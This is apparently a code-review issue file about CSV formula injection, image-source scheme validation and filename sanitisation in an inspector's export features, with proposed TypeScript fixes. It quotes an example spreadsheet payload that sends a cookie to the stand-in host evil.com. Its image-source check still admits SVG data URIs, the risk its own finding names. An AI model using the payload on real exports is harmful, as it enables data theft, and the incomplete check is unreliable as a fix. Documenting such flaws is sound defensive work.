---
status: complete
priority: p1
issue_id: "027"
tags: [code-review, security, inspector]
dependencies: []
---

# CSV Injection & Input Validation in Inspector Exports

## Problem Statement

The DataTab CSV export, ScreenshotTab image rendering, and multiple download flows have insufficient input validation, exposing users to CSV formula injection, potential SVG XSS, and misleading filenames.

## Findings

### 1. CSV Formula Injection (HIGH) — Security Sentinel

**File:** `src/app/components/inspector/tabs/DataTab.tsx:40-45`

The `csvEscape` function handles commas, quotes, and newlines but does NOT neutralize formula-trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`). An attacker controlling scraped data can inject spreadsheet formulas like `=HYPERLINK("https://evil.com/steal?cookie="&A1, "Click")`.

### 2. Insufficient URL Scheme Validation (MEDIUM) — Security Sentinel

**File:** `src/app/components/inspector/tabs/ScreenshotTab.tsx:30-33, 55-58`

Screenshot `data` accepts `data:` URIs of any MIME type. `data:image/svg+xml` URIs can contain embedded JavaScript. Also accepts `http://` (insecure) URLs.

### 3. Download Filename Injection (LOW) — Security Sentinel

**Files:** `ScreenshotTab.tsx:36`, `QuickActions.tsx:24`, `ConfigTab.tsx:134`

Download filenames derived from API-controlled data (`current.label`, `taskName`) without sanitization. Could produce misleading filenames.

## Proposed Solutions

### Solution A: Targeted Fixes (Recommended)

**CSV escape:** Prefix formula-trigger characters:
```typescript
const csvEscape = (v: string) => {
  let safe = v;
  if (/^[=+\-@\t\r]/.test(safe)) safe = `'${safe}`;
  if (safe.includes(",") || safe.includes('"') || safe.includes("\n"))
    return `"${safe.replace(/"/g, '""')}"`;
  return safe;
};
```

**URL validation:** Restrict to safe schemes:
```typescript
function getSafeImageSrc(data: string): string {
  if (data.startsWith("data:image/")) return data;
  if (data.startsWith("https://")) return data;
  if (/^[A-Za-z0-9+/=]+$/.test(data.substring(0, 100)))
    return `data:image/png;base64,${data}`;
  return "";
}
```

**Filename sanitization:**
```typescript
function sanitizeFilename(name: string, ext: string): string {
  return `${name.replace(/[^a-zA-Z0-9_\-]/g, "_").substring(0, 100) || "export"}.${ext}`;
}
```

- Pros: Minimal changes, direct fixes
- Cons: None
- Effort: Small (30 min)
- Risk: Low

## Acceptance Criteria

- [ ] CSV export prefixes formula-trigger characters with single quote
- [ ] Screenshot src only accepts `data:image/*` and `https://` schemes
- [ ] Download filenames are sanitized to alphanumeric + underscore + hyphen

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-03-20 | Created from code review | — |
